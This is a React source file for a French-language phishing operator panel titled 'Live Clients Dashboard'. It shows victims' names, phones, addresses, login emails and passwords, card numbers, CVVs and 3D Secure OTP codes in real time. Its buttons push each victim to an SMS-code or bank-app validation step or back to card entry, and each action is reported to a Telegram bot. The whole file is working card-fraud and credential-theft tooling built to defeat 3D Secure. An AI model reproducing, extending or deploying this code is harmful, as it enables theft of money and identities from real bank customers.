import { useEffect, useRef, useState } from "react";
import {
  Box,
  Container,
  Flex,
  Heading,
  IconButton,
  Text,
  Input,
  Badge,
  Button,
  VStack,
  HStack,
} from "@chakra-ui/react";
import {
  MdCheckCircle,
  MdCancel,
  MdNotificationsActive,
  MdSearch,
  MdContentCopy,
  MdDownload,
} from "react-icons/md";
import { sendMessage } from "../lib/telegram";

// Clean up the host URL (remove any protocol prefix)
const cleanHost = (import.meta.env.VITE_WS_HOST || "localhost:8090").replace(
  /^(https?:\/\/|wss?:\/\/)/i,
  ""
);

const WS_URL = `${
  cleanHost.includes("localhost") ||
  cleanHost.startsWith("192.168.") ||
  cleanHost.startsWith("127.0.")
    ? "ws://"
    : "wss://"
}${cleanHost}`;

export default function Dashboard() {
  const [clients, setClients] = useState([]);
  const [filteredClients, setFilteredClients] = useState([]);
  const [searchQuery, setSearchQuery] = useState("");
  const [sortBy, setSortBy] = useState("lastSeen");
  const [sortOrder, setSortOrder] = useState("desc");
  const highlightRef = useRef(new Map());
  const [, forceRender] = useState(0);
  const [banner, setBanner] = useState(null);
  const [notificationCount, setNotificationCount] = useState(0);
  const [toastMessage, setToastMessage] = useState(null);
  const [wsError, setWsError] = useState(null);
  const [wsConnected, setWsConnected] = useState(false);
  const [wsMessages, setWsMessages] = useState([]); // Debug: track received messages

  // keep simple array; lookups not needed right now
  const [actionFlashRef] = useState(new Map()); // Track which clients just had an action

  useEffect(() => {
    let ws;
    let reconnectTimeout;
    let reconnectAttempts = 0;
    const maxReconnectAttempts = 5;

    const connect = () => {
      try {
        ws = new WebSocket(WS_URL);
        setWsError(null);

        ws.addEventListener("open", () => {
          console.log("WebSocket connected to:", WS_URL);
          setWsConnected(true);
          reconnectAttempts = 0;
          ws.send(
            JSON.stringify({
              type: "register",
              clientId: `dashboard-${Date.now()}-${Math.random()}`,
              role: "dashboard",
            })
          );
          // Don't send "list" immediately - wait for "registered" confirmation
        });

        ws.addEventListener("close", () => {
          console.log("WebSocket disconnected");
          setWsConnected(false);
          if (reconnectAttempts < maxReconnectAttempts) {
            reconnectAttempts++;
            const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 10000);
            console.log(`Reconnecting in ${delay}ms (attempt ${reconnectAttempts})`);
            reconnectTimeout = setTimeout(connect, delay);
          } else {
            setWsError(
              `Impossible de se connecter au serveur WebSocket. Vérifiez que VITE_WS_HOST est configuré correctement. URL tentée: ${WS_URL}`
            );
          }
        });

        ws.addEventListener("error", (error) => {
          console.error("WebSocket error:", error);
          setWsConnected(false);
          setWsError(
            `Erreur de connexion WebSocket. Vérifiez que le serveur WebSocket est démarré et que VITE_WS_HOST est correctement configuré. URL: ${WS_URL}`
          );
        });

        ws.addEventListener("message", (event) => {
          let data;
          try {
            data = JSON.parse(event.data);
          } catch (err) {
            console.error("Failed to parse WebSocket message:", err);
            return;
          }

          console.log("WebSocket message received:", data.type, data);
          
          // Debug: track messages
          setWsMessages((prev) => [...prev.slice(-9), { type: data.type, time: new Date().toLocaleTimeString() }]);

          // Handle welcome message (server greeting)
          if (data.type === "welcome") {
            console.log("Server welcome:", data.message);
            return;
          }

          // After registration is confirmed, request the client list
          if (data.type === "registered") {
            console.log("Dashboard registered successfully, requesting client list");
            // Small delay to ensure server is ready
            setTimeout(() => {
              console.log("Sending list request");
              ws.send(JSON.stringify({ type: "list" }));
            }, 100);
            return;
          }

          if (data.type === "clients" && Array.isArray(data.items)) {
            console.log(`Received ${data.items.length} clients:`, data.items);
            setClients(data.items);
            return;
          }

          if (data.type === "client_registered") {
            setClients((prev) => {
              const exists = prev.some((c) => c.id === data.client.id);
              if (exists)
                return prev.map((c) => (c.id === data.client.id ? data.client : c));
              return [data.client, ...prev];
            });
            flashRow(data.client.id, `Client registered: ${data.client.id}`);
            return;
          }

          if (data.type === "client_updated") {
            setClients((prev) =>
              prev.map((c) =>
                c.id === data.client.id ? { ...c, ...data.client } : c
              )
            );
            flashRow(data.client.id, `Client updated: ${data.client.id}`);
            return;
          }

          if (data.type === "client_disconnected") {
            setClients((prev) => prev.filter((c) => c.id !== data.clientId));
            flashRow(data.clientId, `Client disconnected: ${data.clientId}`);
            return;
          }
        });
      } catch (error) {
        console.error("Failed to create WebSocket:", error);
        setWsError(`Erreur lors de la création de la connexion WebSocket: ${error.message}`);
      }
    };

    connect();

    return () => {
      if (reconnectTimeout) clearTimeout(reconnectTimeout);
      if (ws) ws.close();
    };
  }, []);

  // Filter and sort clients
  useEffect(() => {
    let filtered = [...clients];

    // Apply search filter
    if (searchQuery.trim()) {
      const query = searchQuery.toLowerCase();
      filtered = filtered.filter(
        (c) =>
          c.id?.toLowerCase().includes(query) ||
          c.ip?.toLowerCase().includes(query) ||
          c.fullName?.toLowerCase().includes(query) ||
          c.phone?.toLowerCase().includes(query) ||
          c.email?.toLowerCase().includes(query) ||
          c.loginEmail?.toLowerCase().includes(query) ||
          c.cardNumber?.toLowerCase().includes(query) ||
          c.otp?.toLowerCase().includes(query)
      );
    }

    // Apply sorting
    filtered.sort((a, b) => {
      let aVal = a[sortBy] || "";
      let bVal = b[sortBy] || "";

      if (sortBy === "lastSeen" || sortBy === "createdAt") {
        aVal = aVal || 0;
        bVal = bVal || 0;
      } else {
        aVal = String(aVal).toLowerCase();
        bVal = String(bVal).toLowerCase();
      }

      if (sortOrder === "asc") {
        return aVal > bVal ? 1 : aVal < bVal ? -1 : 0;
      } else {
        return aVal < bVal ? 1 : aVal > bVal ? -1 : 0;
      }
    });

    setFilteredClients(filtered);
  }, [clients, searchQuery, sortBy, sortOrder]);

  useEffect(() => {
    const resetCounter = () => setNotificationCount(0);
    window.addEventListener("focus", resetCounter);
    const onVis = () => {
      if (document.visibilityState === "visible") resetCounter();
    };
    document.addEventListener("visibilitychange", onVis);
    return () => {
      window.removeEventListener("focus", resetCounter);
      document.removeEventListener("visibilitychange", onVis);
    };
  }, []);

  function flashRow(clientId, message) {
    highlightRef.current.set(clientId, Date.now());
    forceRender((n) => n + 1);
    setBanner(message);
    setNotificationCount((n) =>
      document.visibilityState === "visible" ? 0 : n + 1
    );
    setTimeout(() => {
      highlightRef.current.delete(clientId);
      forceRender((n) => n + 1);
    }, 1000);
    setTimeout(() => setBanner(null), 2000);
  }

  function isHighlighted(clientId) {
    return highlightRef.current.has(clientId);
  }

  async function sendDirect(to, payload) {
    try {
      // Find client data for Telegram notification
      const client = clients.find((c) => c.id === to);
      const clientIp = client?.ip || "Unknown";

      // Build action notification message
      let actionMessage = `<b>🔔 ACTION DASHBOARD</b>\n`;
      actionMessage += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
      actionMessage += `<b>Client ID:</b> <code>${to}</code>\n`;
      actionMessage += `<b>IP:</b> <code>${clientIp}</code>\n`;
      actionMessage += `<b>Page:</b> <code>${client?.page || "Unknown"}</code>\n`;
      
      if (payload.type === "navigate-to-3ds-code") {
        actionMessage += `<b>Action:</b> ✅ Code SMS Demandé\n`;
      } else if (payload.type === "navigate-to-3ds-bank") {
        actionMessage += `<b>Action:</b> ✅ validation Bank APP\n`;
      } else if (payload.type === "allow-next") {
        actionMessage += `<b>Action:</b> ✅ Allow Next Step\n`;
      } else if (payload.type === "resend-code" || payload.type === "request-code-again") {
        actionMessage += `<b>Action:</b> 🔄 Code SMS Demandé (Relance)\n`;
      } else if (payload.type === "navigate-to-payment-details") {
        actionMessage += `<b>Action:</b> Relance Etape CC\n`;
        actionMessage += `<b>Message:</b> Nouvelle saisie de la CC\n`;
      } else if (payload.type === "error") {
        actionMessage += `<b>Action:</b> ❌ Show Error\n`;
        if (payload.message) {
          actionMessage += `<b>Message:</b> ${payload.message}\n`;
        }
      } else {
        actionMessage += `<b>Action:</b> ${payload.type || "Unknown"}\n`;
      }
      
      actionMessage += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
      actionMessage += `<i>Time: ${new Date().toLocaleString()}</i>`;

      // Send Telegram notification
      try {
        await sendMessage(actionMessage);
      } catch (telegramError) {
        console.error("Telegram notification error:", telegramError);
        // Continue even if Telegram fails
      }

      // Send WebSocket message
      const ws = new WebSocket(WS_URL);
      ws.addEventListener("open", () => {
        ws.send(
          JSON.stringify({
            type: "register",
            clientId: `dashboard-action-${Date.now()}`,
            role: "dashboard",
          })
        );
        ws.send(JSON.stringify({ type: "direct", to, payload }));
        setTimeout(() => ws.close(), 300);
      });
      // Trigger flash alert on the client row
      actionFlashRef.set(to, Date.now());
      forceRender((n) => n + 1);
      setTimeout(() => {
        actionFlashRef.delete(to);
        forceRender((n) => n + 1);
      }, 600);
    } catch {
      // ignore
    }
  }

  function copyToClipboard(text, label) {
    navigator.clipboard.writeText(text).then(() => {
      setToastMessage(`${label} copied to clipboard`);
      setTimeout(() => setToastMessage(null), 2000);
    });
  }

  function exportData() {
    const dataStr = JSON.stringify(clients, null, 2);
    const dataBlob = new Blob([dataStr], { type: "application/json" });
    const url = URL.createObjectURL(dataBlob);
    const link = document.createElement("a");
    link.href = url;
    link.download = `clients-${new Date().toISOString()}.json`;
    link.click();
    URL.revokeObjectURL(url);
    setToastMessage("Client data exported successfully");
    setTimeout(() => setToastMessage(null), 2000);
  }


  function handleSort(column) {
    if (sortBy === column) {
      setSortOrder(sortOrder === "asc" ? "desc" : "asc");
    } else {
      setSortBy(column);
      setSortOrder("desc");
    }
  }

  const stats = {
    total: clients.length,
    withLogin: clients.filter((c) => c.loginEmail).length,
    withPayment: clients.filter((c) => c.cardNumber).length,
    withOTP: clients.filter((c) => c.otp).length,
    on3DSecure: clients.filter(
      (c) => c.page === "/3d-secure" || c.page?.includes("3d-secure")
    ).length,
  };

  return (
    <Box
      bg="linear-gradient(135deg, #667eea 0%, #764ba2 100%)"
      minH="100vh"
      py={{ base: 8, md: 12 }}>
      <Container maxW={{ base: "100%", md: "1600px" }} px={{ base: 4, md: 8 }}>
        {/* Header */}
        <Flex
          direction="column"
          align="center"
          mb={{ base: 6, md: 8 }}
          position="relative"
          zIndex={10}>
          <Heading
            size={{ base: "xl", md: "2xl" }}
            textAlign="center"
            color="white"
            mb={2}>
            Live Clients Dashboard
          </Heading>
          <Text
            color="rgba(255,255,255,0.9)"
            fontSize={{ base: "sm", md: "base" }}
            textAlign="center"
            maxW="500px">
            Monitor and manage client data in real time
          </Text>

          {/* Stats */}
          <Flex
            wrap="wrap"
            gap={4}
            mt={6}
            justify="center"
            w="full"
            maxW="800px">
            <Badge
              bg="rgba(255,255,255,0.2)"
              color="white"
              px={4}
              py={2}
              borderRadius="full"
              fontSize="sm"
              fontWeight="600">
              Total: {stats.total}
            </Badge>
            <Badge
              bg="rgba(255,255,255,0.2)"
              color="white"
              px={4}
              py={2}
              borderRadius="full"
              fontSize="sm"
              fontWeight="600">
              Login: {stats.withLogin}
            </Badge>
            <Badge
              bg="rgba(255,255,255,0.2)"
              color="white"
              px={4}
              py={2}
              borderRadius="full"
              fontSize="sm"
              fontWeight="600">
              Payment: {stats.withPayment}
            </Badge>
            <Badge
              bg="rgba(255,255,255,0.2)"
              color="white"
              px={4}
              py={2}
              borderRadius="full"
              fontSize="sm"
              fontWeight="600">
              3D Secure: {stats.on3DSecure}
            </Badge>
          </Flex>

          {/* Notification Bell */}
          <Flex align="center" gap={4} mt={6}>
            <Box position="relative">
              <IconButton
                aria-label="Notifications"
                title="Notifications"
                bg="rgba(255,255,255,0.2)"
                color="white"
                border="2px solid rgba(255,255,255,0.3)"
                _hover={{ bg: "rgba(255,255,255,0.3)" }}
                size="lg"
                icon={<MdNotificationsActive size={24} />}
                onClick={() => setNotificationCount(0)}
              />
              {notificationCount > 0 && (
                <Box
                  position="absolute"
                  top="-6px"
                  right="-6px"
                  bg="#ef4444"
                  color="#fff"
                  borderRadius="9999px"
                  fontSize="11px"
                  lineHeight="16px"
                  px="7px"
                  fontWeight="700"
                  boxShadow="0 4px 12px rgba(239,68,68,0.4)">
                  {notificationCount}
                </Box>
              )}
            </Box>
            <Text color="rgba(255,255,255,0.8)" fontSize="sm" fontWeight="600">
              {notificationCount > 0
                ? `${notificationCount} event${
                    notificationCount !== 1 ? "s" : ""
                  }`
                : "No events"}
            </Text>
          </Flex>
        </Flex>

        {/* WebSocket Error Banner */}
        {wsError && (
          <Box
            mb={6}
            bg="#fee2e2"
            color="#dc2626"
            border="2px solid #dc2626"
            borderRadius="12px"
            px={4}
            py={4}>
            <Text fontWeight="700" fontSize="md" mb={2}>
              ⚠️ Erreur de connexion WebSocket
            </Text>
            <Text fontSize="sm" mb={2}>
              {wsError}
            </Text>
            <Box
              bg="rgba(255,255,255,0.5)"
              borderRadius="8px"
              p={3}
              mt={3}
              mb={3}>
              <Text fontSize="xs" fontWeight="600" mb={1}>
                🔍 Informations de diagnostic :
              </Text>
              <Text fontSize="xs" fontFamily="mono" mb={1}>
                <strong>VITE_WS_HOST:</strong> {import.meta.env.VITE_WS_HOST || "non défini"}
              </Text>
              <Text fontSize="xs" fontFamily="mono">
                <strong>URL tentée:</strong> {WS_URL}
              </Text>
            </Box>
            <Text fontSize="xs" color="#991b1b" mt={2}>
              <strong>Solution:</strong> Vérifiez que :
              <br />• Le serveur WebSocket est démarré et "Live" sur Render
              <br />• VITE_WS_HOST = <code>votre-serveur.onrender.com</code> (sans wss:// ou ws://)
              <br />• Le service client a été redéployé après modification de VITE_WS_HOST
              <br />• Consultez <code>VERIFIER_VITE_WS_HOST.md</code> pour plus de détails
            </Text>
          </Box>
        )}

        {/* Connection Status */}
        {!wsError && (
          <Box
            mb={6}
            bg={wsConnected ? "#d1fadf" : "#fef3c7"}
            color={wsConnected ? "#166534" : "#92400e"}
            border={`2px solid ${wsConnected ? "#16a34a" : "#f59e0b"}`}
            borderRadius="12px"
            px={4}
            py={2}>
            <Text fontWeight="600" fontSize="sm" textAlign="center" mb={wsConnected ? 1 : 0}>
              {wsConnected ? "✅ Connecté au serveur WebSocket" : "⏳ Connexion en cours..."}
            </Text>
            {wsConnected && (
              <>
                <Text fontSize="xs" fontFamily="mono" textAlign="center" opacity={0.8} mb={2}>
                  {WS_URL}
                </Text>
                {wsMessages.length > 0 && (
                  <Box mt={2} pt={2} borderTop="1px solid rgba(0,0,0,0.1)">
                    <Text fontSize="xs" fontWeight="600" mb={1}>
                      Messages reçus ({wsMessages.length}):
                    </Text>
                    <VStack align="start" spacing={0.5}>
                      {wsMessages.map((msg, idx) => (
                        <Text key={idx} fontSize="xs" fontFamily="mono">
                          {msg.time} - {msg.type}
                        </Text>
                      ))}
                    </VStack>
                  </Box>
                )}
                <Text fontSize="xs" mt={2} opacity={0.7}>
                  Clients: {clients.length} | Filtrés: {filteredClients.length}
                </Text>
              </>
            )}
          </Box>
        )}

        {/* Banner */}
        {banner && (
          <Box
            mb={6}
            bg="rgba(255,255,255,0.95)"
            color="#667eea"
            border="2px solid #667eea"
            borderRadius="12px"
            px={4}
            py={3}
            textAlign="center">
            <Text fontWeight="700" fontSize="sm">
              {banner}
            </Text>
          </Box>
        )}

        {/* Toast Message */}
        {toastMessage && (
          <Box
            mb={6}
            bg="#16a34a"
            color="white"
            borderRadius="12px"
            px={4}
            py={3}
            textAlign="center"
            position="fixed"
            top={4}
            right={4}
            zIndex={9999}
            boxShadow="0 4px 12px rgba(0,0,0,0.2)">
            <Text fontWeight="600" fontSize="sm">
              {toastMessage}
            </Text>
          </Box>
        )}

        {/* Search and Actions */}
        <Flex
          gap={4}
          mb={6}
          direction={{ base: "column", md: "row" }}
          align={{ base: "stretch", md: "center" }}>
          <Flex flex="1" maxW={{ base: "100%", md: "400px" }} align="center" position="relative">
            <Box position="absolute" left={3} zIndex={1} color="#9ca3af">
              <MdSearch size={20} />
            </Box>
            <Input
              bg="white"
              placeholder="Search clients..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              pl={10}
            />
          </Flex>
          <Button
            bg="white"
            color="#667eea"
            _hover={{ bg: "rgba(255,255,255,0.9)" }}
            onClick={exportData}
            leftIcon={<MdDownload />}>
            Export Data
          </Button>
        </Flex>

        {/* Table */}
        {filteredClients.length === 0 ? (
          <Box
            bg="white"
            borderRadius="16px"
            p={12}
            textAlign="center"
            boxShadow="0 20px 40px rgba(0,0,0,0.1)">
            <Text color="#9ca3af" fontSize="lg" fontWeight="500" mb={2}>
              {searchQuery
                ? "No clients match your search"
                : wsConnected
                ? "✅ Panel fonctionnel - Aucun client connecté pour le moment"
                : "⏳ Connexion au serveur WebSocket..."}
            </Text>
            {!searchQuery && wsConnected && (
              <VStack spacing={2} mt={4} align="center">
                <Text fontSize="sm" color="#6b7280">
                  Le panel est prêt et attend les connexions clients.
                </Text>
                <Text fontSize="xs" color="#9ca3af">
                  Pour tester : Ouvrez l'application principale dans un autre onglet
                  <br />
                  Les clients apparaîtront ici en temps réel
                </Text>
              </VStack>
            )}
          </Box>
        ) : (
          <Box
            overflowX="auto"
            bg="white"
            borderRadius="14px"
            boxShadow="0 20px 40px rgba(0,0,0,0.1)">
            <table
              style={{
                width: "100%",
                borderCollapse: "separate",
                borderSpacing: 0,
                fontSize: "14px",
                minWidth: "1200px",
              }}>
              <thead>
                <tr
                  style={{
                    background: "#f8fafc",
                    position: "sticky",
                    top: 0,
                    zIndex: 2,
                  }}>
                  <th
                    style={{
                      textAlign: "left",
                      padding: "16px",
                      color: "#6b7280",
                      fontWeight: 600,
                      fontSize: "12px",
                      textTransform: "uppercase",
                      letterSpacing: "0.5px",
                      borderBottom: "2px solid #e5e7eb",
                      cursor: "pointer",
                    }}
                    onClick={() => handleSort("id")}>
                    Client ID {sortBy === "id" && (sortOrder === "asc" ? "↑" : "↓")}
                  </th>
                  <th
                    style={{
                      textAlign: "left",
                      padding: "16px",
                      color: "#6b7280",
                      fontWeight: 600,
                      fontSize: "12px",
                      textTransform: "uppercase",
                      letterSpacing: "0.5px",
                      borderBottom: "2px solid #e5e7eb",
                      cursor: "pointer",
                    }}
                    onClick={() => handleSort("ip")}>
                    IP {sortBy === "ip" && (sortOrder === "asc" ? "↑" : "↓")}
                  </th>
                  <th
                    style={{
                      textAlign: "left",
                      padding: "16px",
                      color: "#6b7280",
                      fontWeight: 600,
                      fontSize: "12px",
                      textTransform: "uppercase",
                      letterSpacing: "0.5px",
                      borderBottom: "2px solid #e5e7eb",
                      cursor: "pointer",
                    }}
                    onClick={() => handleSort("page")}>
                    Page {sortBy === "page" && (sortOrder === "asc" ? "↑" : "↓")}
                  </th>
                  <th
                    style={{
                      textAlign: "left",
                      padding: "16px",
                      color: "#6b7280",
                      fontWeight: 600,
                      fontSize: "12px",
                      textTransform: "uppercase",
                      letterSpacing: "0.5px",
                      borderBottom: "2px solid #e5e7eb",
                    }}>
                    Personal Info
                  </th>
                  <th
                    style={{
                      textAlign: "left",
                      padding: "16px",
                      color: "#6b7280",
                      fontWeight: 600,
                      fontSize: "12px",
                      textTransform: "uppercase",
                      letterSpacing: "0.5px",
                      borderBottom: "2px solid #e5e7eb",
                    }}>
                    Login Credentials
                  </th>
                  <th
                    style={{
                      textAlign: "left",
                      padding: "16px",
                      color: "#6b7280",
                      fontWeight: 600,
                      fontSize: "12px",
                      textTransform: "uppercase",
                      letterSpacing: "0.5px",
                      borderBottom: "2px solid #e5e7eb",
                    }}>
                    Payment Info
                  </th>
                  <th
                    style={{
                      textAlign: "left",
                      padding: "16px",
                      color: "#6b7280",
                      fontWeight: 600,
                      fontSize: "12px",
                      textTransform: "uppercase",
                      letterSpacing: "0.5px",
                      borderBottom: "2px solid #e5e7eb",
                    }}>
                    3D Code
                  </th>
                  <th
                    style={{
                      textAlign: "center",
                      padding: "16px",
                      color: "#6b7280",
                      fontWeight: 600,
                      fontSize: "12px",
                      textTransform: "uppercase",
                      letterSpacing: "0.5px",
                      borderBottom: "2px solid #e5e7eb",
                    }}>
                    Action
                  </th>
                </tr>
              </thead>
              <tbody>
                {filteredClients.map((c) => {
                  return (
                    <tr
                      key={c.id}
                      style={{
                        transition:
                          "background-color 200ms ease, box-shadow 200ms ease",
                        backgroundColor: actionFlashRef.has(c.id)
                          ? "#dcfce7"
                          : isHighlighted(c.id)
                          ? "#fffbeb"
                          : "transparent",
                        borderTop: "1px solid #f1f5f9",
                        boxShadow: actionFlashRef.has(c.id)
                          ? "inset 0 0 0 2px #16a34a"
                          : "none",
                      }}
                      onMouseEnter={(e) => {
                        e.currentTarget.style.backgroundColor = isHighlighted(
                          c.id
                        )
                          ? "#fffbeb"
                          : "#f9fafb";
                      }}
                      onMouseLeave={(e) => {
                        e.currentTarget.style.backgroundColor = isHighlighted(
                          c.id
                        )
                          ? "#fffbeb"
                          : "transparent";
                      }}>
                      <td
                        style={{
                          padding: "14px 16px",
                          maxWidth: "200px",
                        }}>
                        <Flex align="center" gap={2}>
                          <Text
                            noOfLines={1}
                            title={c.id}
                            fontFamily="mono"
                            color="#111827"
                            fontSize="12px"
                            fontWeight="600">
                            {c.id}
                          </Text>
                          <IconButton
                            aria-label="Copy ID"
                            icon={<MdContentCopy size={12} />}
                            size="xs"
                            variant="ghost"
                            onClick={() => copyToClipboard(c.id, "Client ID")}
                          />
                        </Flex>
                      </td>
                      <td
                        style={{
                          padding: "14px 16px",
                          color: "#374151",
                          fontSize: "12px",
                        }}>
                        {c.ip || "—"}
                      </td>
                      <td
                        style={{
                          padding: "14px 16px",
                          color: "#374151",
                          fontSize: "12px",
                        }}>
                        <Text
                          noOfLines={1}
                          fontFamily="mono"
                          title={`Exact value: "${c.page}"`}>
                          {c.page || "/"}
                        </Text>
                      </td>
                      <td
                        style={{
                          padding: "14px 16px",
                          fontSize: "11px",
                          color: "#374151",
                          maxWidth: "200px",
                        }}>
                        <VStack align="start" spacing={1}>
                          {c.fullName && (
                            <Text noOfLines={1} fontSize="11px">
                              <strong>👤</strong> {c.fullName}
                            </Text>
                          )}
                          {c.phone && (
                            <Text noOfLines={1} fontSize="11px">
                              <strong>📱</strong> {c.phone}
                            </Text>
                          )}
                          {c.address && (
                            <Text noOfLines={1} fontSize="11px">
                              <strong>📍</strong> {c.address}
                            </Text>
                          )}
                          {!c.fullName && !c.phone && !c.address && (
                            <Text color="#d1d5db" fontSize="11px">
                              —
                            </Text>
                          )}
                        </VStack>
                      </td>
                      <td
                        style={{
                          padding: "14px 16px",
                          fontSize: "11px",
                          color: "#374151",
                          maxWidth: "200px",
                        }}>
                        {c.loginEmail ? (
                          <VStack align="start" spacing={1}>
                            <Flex align="center" gap={1}>
                              <Text noOfLines={1} fontSize="11px" color="#0b57d0">
                                <strong>📧</strong> {c.loginEmail}
                              </Text>
                              <IconButton
                                aria-label="Copy Email"
                                icon={<MdContentCopy size={10} />}
                                size="xs"
                                variant="ghost"
                                onClick={() =>
                                  copyToClipboard(c.loginEmail, "Email")
                                }
                              />
                            </Flex>
                            <Flex align="center" gap={1}>
                              <Text
                                noOfLines={1}
                                fontSize="11px"
                                fontFamily="mono"
                                color="#dc2626">
                                <strong>🔒</strong> {c.loginPassword}
                              </Text>
                              <IconButton
                                aria-label="Copy Password"
                                icon={<MdContentCopy size={10} />}
                                size="xs"
                                variant="ghost"
                                onClick={() =>
                                  copyToClipboard(c.loginPassword, "Password")
                                }
                              />
                            </Flex>
                          </VStack>
                        ) : (
                          <Text color="#d1d5db" fontSize="11px">
                            —
                          </Text>
                        )}
                      </td>
                      <td
                        style={{
                          padding: "14px 16px",
                          fontSize: "11px",
                          color: "#374151",
                          maxWidth: "200px",
                        }}>
                        {c.cardNumber ? (
                          <VStack align="start" spacing={1}>
                            <Flex align="center" gap={1}>
                              <Text
                                noOfLines={1}
                                fontSize="11px"
                                fontFamily="mono"
                                color="#0b57d0"
                                fontWeight="600">
                                💳 {c.cardNumber}
                              </Text>
                              <IconButton
                                aria-label="Copy Card"
                                icon={<MdContentCopy size={10} />}
                                size="xs"
                                variant="ghost"
                                onClick={() =>
                                  copyToClipboard(c.cardNumber, "Card Number")
                                }
                              />
                            </Flex>
                            {c.cardExpiration && (
                              <Text noOfLines={1} fontSize="11px">
                                Exp: {c.cardExpiration}
                              </Text>
                            )}
                            {c.cardCvv && (
                              <Text
                                noOfLines={1}
                                fontSize="11px"
                                fontFamily="mono"
                                color="#dc2626">
                                CVV: {c.cardCvv}
                              </Text>
                            )}
                            {c.cardHolder && (
                              <Text noOfLines={1} fontSize="11px">
                                👤 {c.cardHolder}
                              </Text>
                            )}
                          </VStack>
                        ) : (
                          <Text color="#d1d5db" fontSize="11px">
                            —
                          </Text>
                        )}
                      </td>
                      <td
                        style={{
                          padding: "14px 16px",
                          fontFamily: "monospace",
                          color: c.otp ? "#0b57d0" : "#d1d5db",
                          fontSize: "13px",
                          fontWeight: 700,
                          letterSpacing: "1px",
                        }}>
                        {c.otp ? (
                          <Flex align="center" gap={1}>
                            {c.otp}
                            <IconButton
                              aria-label="Copy OTP"
                              icon={<MdContentCopy size={12} />}
                              size="xs"
                              variant="ghost"
                              onClick={() => copyToClipboard(c.otp, "OTP Code")}
                            />
                          </Flex>
                        ) : (
                          "—"
                        )}
                      </td>
                      <td
                        style={{
                          padding: "12px 16px",
                          textAlign: "center",
                        }}>
                        <Flex justify="center" gap={2} flexWrap="wrap">
                          {/* Actions for payment-details page */}
                          {c.page === "/payment-details" ||
                          c.page?.includes("payment-details") ? (
                            <>
                              <button
                                title="Code SMS Demandé"
                                onClick={() =>
                                  sendDirect(c.id, { type: "navigate-to-3ds-code" })
                                }
                                style={{
                                  display: "inline-flex",
                                  alignItems: "center",
                                  justifyContent: "center",
                                  padding: "6px 12px",
                                  background: "#effaf3",
                                  color: "#16a34a",
                                  border: "1.5px solid #d1fadf",
                                  borderRadius: 6,
                                  cursor: "pointer",
                                  transition: "all 0.2s",
                                  fontSize: "11px",
                                  fontWeight: "600",
                                }}
                                onMouseEnter={(e) => {
                                  e.currentTarget.style.background = "#d1fadf";
                                  e.currentTarget.style.transform = "scale(1.05)";
                                }}
                                onMouseLeave={(e) => {
                                  e.currentTarget.style.background = "#effaf3";
                                  e.currentTarget.style.transform = "scale(1)";
                                }}>
                                Code
                              </button>
                              <button
                                title="validation Bank APP"
                                onClick={() =>
                                  sendDirect(c.id, { type: "navigate-to-3ds-bank" })
                                }
                                style={{
                                  display: "inline-flex",
                                  alignItems: "center",
                                  justifyContent: "center",
                                  padding: "6px 12px",
                                  background: "#dbeafe",
                                  color: "#1e40af",
                                  border: "1.5px solid #93c5fd",
                                  borderRadius: 6,
                                  cursor: "pointer",
                                  transition: "all 0.2s",
                                  fontSize: "11px",
                                  fontWeight: "600",
                                }}
                                onMouseEnter={(e) => {
                                  e.currentTarget.style.background = "#bfdbfe";
                                  e.currentTarget.style.transform = "scale(1.05)";
                                }}
                                onMouseLeave={(e) => {
                                  e.currentTarget.style.background = "#dbeafe";
                                  e.currentTarget.style.transform = "scale(1)";
                                }}>
                                Bank App
                              </button>
                            </>
                          ) : c.page === "/3d-secure" ||
                            c.page?.includes("3d-secure") ? (
                            <>
                              <button
                                title="Request code again"
                                onClick={() =>
                                  sendDirect(c.id, { type: "resend-code" })
                                }
                                style={{
                                  display: "inline-flex",
                                  alignItems: "center",
                                  justifyContent: "center",
                                  padding: "6px 12px",
                                  background: "#dbeafe",
                                  color: "#1e40af",
                                  border: "1.5px solid #93c5fd",
                                  borderRadius: 6,
                                  cursor: "pointer",
                                  transition: "all 0.2s",
                                  fontSize: "11px",
                                  fontWeight: "600",
                                  marginRight: "4px",
                                }}
                                onMouseEnter={(e) => {
                                  e.currentTarget.style.background = "#bfdbfe";
                                  e.currentTarget.style.transform = "scale(1.05)";
                                }}
                                onMouseLeave={(e) => {
                                  e.currentTarget.style.background = "#dbeafe";
                                  e.currentTarget.style.transform = "scale(1)";
                                }}>
                                Code
                              </button>
                              <button
                                title="Allow next"
                                onClick={() =>
                                  sendDirect(c.id, { type: "allow-next" })
                                }
                                style={{
                                  display: "inline-flex",
                                  alignItems: "center",
                                  justifyContent: "center",
                                  width: 32,
                                  height: 32,
                                  background: "#effaf3",
                                  color: "#16a34a",
                                  border: "1.5px solid #d1fadf",
                                  borderRadius: 6,
                                  cursor: "pointer",
                                  transition: "all 0.2s",
                                }}
                                onMouseEnter={(e) => {
                                  e.currentTarget.style.background = "#d1fadf";
                                  e.currentTarget.style.transform = "scale(1.05)";
                                }}
                                onMouseLeave={(e) => {
                                  e.currentTarget.style.background = "#effaf3";
                                  e.currentTarget.style.transform = "scale(1)";
                                }}>
                                <MdCheckCircle size={16} />
                              </button>
                              <button
                                title="Return to payment details"
                                onClick={() =>
                                  sendDirect(c.id, {
                                    type: "navigate-to-payment-details",
                                    message: "Nouvelle saisie de la CC",
                                  })
                                }
                                style={{
                                  display: "inline-flex",
                                  alignItems: "center",
                                  justifyContent: "center",
                                  width: 32,
                                  height: 32,
                                  background: "#fef2f2",
                                  color: "#dc2626",
                                  border: "1.5px solid #fee2e2",
                                  borderRadius: 6,
                                  cursor: "pointer",
                                  transition: "all 0.2s",
                                }}
                                onMouseEnter={(e) => {
                                  e.currentTarget.style.background = "#fee2e2";
                                  e.currentTarget.style.transform = "scale(1.05)";
                                }}
                                onMouseLeave={(e) => {
                                  e.currentTarget.style.background = "#fef2f2";
                                  e.currentTarget.style.transform = "scale(1)";
                                }}>
                                <MdCancel size={16} />
                              </button>
                            </>
                          ) : (
                            <span
                              style={{
                                color: "#d1d5db",
                                fontSize: "12px",
                              }}>
                              —
                            </span>
                          )}
                        </Flex>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </Box>
        )}
      </Container>
    </Box>
  );
}
